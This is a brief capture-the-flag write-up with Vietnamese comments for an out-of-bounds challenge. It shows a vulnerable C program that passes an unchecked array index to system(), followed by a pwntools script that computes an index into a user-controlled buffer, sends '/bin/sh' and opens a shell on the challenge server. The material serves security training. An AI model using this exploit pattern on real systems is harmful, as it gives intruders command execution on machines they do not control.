```sh
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char name[16];

char *command[10] = { "cat",
    "ls",
    "id",
    "ps",
    "file ./oob" };
void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main()
{
    int idx;

    initialize();

    printf("Admin name: ");
    read(0, name, sizeof(name));
    printf("What do you want?: ");

    scanf("%d", &idx);       # idx ko dưới hạn, ta có thể ghi vào 1 số bất kì       

    system(command[idx]);   # Lỗi out_of_bound khi `idx<0` hoặc `idx>=10` : Truy cập ngoài mảng command

    return 0;
}
```

* 
```sh
from pwn import * 
p = remote("host3.dreamhack.games", 21248)
e=ELF("./out_of_bound")

name_address= e.symbols['name']
command_addr = e.symbols['command']

idx = (name_address - command_addr) / 4    # Tính toán idx

payload = p32(name_address + 4) + b'/bin/sh\x00'  

p.sendafter(b"Admin name: ", payload)

p.sendlineafter(b"What do you want?: ", str(idx).encode())

p.interactive()
```

* <img width="433" height="443" alt="image" src="https://github.com/user-attachments/assets/7a4c7e05-3cc6-4ef5-a23a-3fbed1a704fc" />
